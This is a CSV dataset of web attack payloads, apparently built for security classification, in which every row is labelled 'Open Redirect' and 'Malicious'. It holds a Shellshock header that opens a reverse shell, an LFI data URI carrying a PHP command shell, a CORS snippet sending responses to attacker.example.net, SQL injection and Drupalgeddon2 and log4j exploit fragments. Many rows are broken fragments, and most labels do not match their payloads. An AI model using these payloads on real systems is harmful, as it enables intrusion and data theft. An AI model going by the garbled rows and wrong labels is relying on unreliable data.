Payload,Signature,AttackType,Severity,MITRE,Label,Description
# DOC: https://medium.com/@_bl4de/remote-code-execution-with-groovy-console-in-jenkins-bd6ef55c285b,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"$remote = ""http://172.18.0.3:3000""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"curl --silent -k -H ""User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1"" ""https://10.0.0.1/cgi-bin/admin.cgi""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Link: https://example.com/[INJECTION STARTS HERE],Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
%0d%0aLocation:%20http://myweb.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Inject a ",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"| """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  puts ""       ruby drupalgeddon2.rb https://example.com""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  $target = ""http://#{$target}""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# origin : https://github.com/noperator/CVE-2019-18935,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<iframe src=""http://target site"" security=""restricted""></iframe>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<iframe src=""http://target site"" sandbox></iframe>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<iframe src=""http://target site"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"window.top.location = ""http://attacker.site/204.php"";",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<iframe src=""http://target site"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<iframe src=""https://legitimate-site.com/login"" width=""500"" height=""500""></iframe>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    payload_1 = ""<soapenv:Envelope xmlns:soapenv=\""http://schemas.xmlsoap.org/soap/envelope/\""> \n"" \",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"                ""       <work:WorkContext xmlns:work=\""http://bea.com/2004/06/soap/workarea/\""> \n"" \",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Origin: https://evil.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Access-Control-Allow-Origin: https://evil.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"""https://victim.example.com/endpoint"", true);",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Origin: https://evil.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Origin: https://evilexample.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Access-Control-Allow-Origin: https://evilexample.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Origin: https://apiiexample.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Access-Control-Allow-Origin: https://apiiexample.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Origin: https://evil.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Access-Control-Allow-Origin: https://evil.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"./kadimus -u ""http://example.com/index.php?page=vuln"" -S -f ""index.php%00"" -O index.php --parameter page",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"curl ""http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"" | base64 -d > index.php",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",Open Redirect,Open Redirect,High,T1190,Malicious,Open Redirect payload from comprehensive dataset
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
[*] The following URL is targeted : http://127.0.0.1,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
  ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,High,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"- Backend must not use """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)," the script will use either the """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
firefox --screenshot https://www.google.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""" --headless --disable-gpu --window-size=1280","720 --screenshot=""""C:\tmp\screen.png"""" """"https://google.com""""""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - WCMN alternative using Python to fix the websocket connection with an empty """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Node inspector """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"1. Chrome will make 2 DNS requests: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"The """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
$ git clone https://gitlab.com/dee-see/graphql-path-enum,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
